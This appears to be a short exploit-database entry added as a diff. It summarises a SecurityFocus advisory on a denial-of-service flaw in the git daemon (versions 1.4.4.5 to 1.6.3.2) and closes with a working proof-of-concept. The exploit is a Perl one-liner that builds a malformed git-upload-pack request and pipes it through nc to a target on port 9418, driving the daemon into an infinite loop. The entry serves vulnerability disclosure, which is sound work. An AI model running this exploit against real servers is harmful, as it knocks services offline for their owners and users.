@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/35338/info
+
+
+Git is prone to a denial-of-service vulnerability because it fails to properly handle some client requests.
+
+Attackers can exploit this issue to cause a daemon process to enter an infinite loop. Repeated exploits may consume excessive system resources, resulting in a denial-of-service condition.
+
+Git 1.4.4.5 through 1.6.3.2 are vulnerable; other versions may also be affected.
+
+$ perl -e '
+$s="git-upload-pack git\0user=me\0host=localhost\0";
+printf "%4.4x%s",4+length $s,$s
+' | nc $GITHOST 9418 
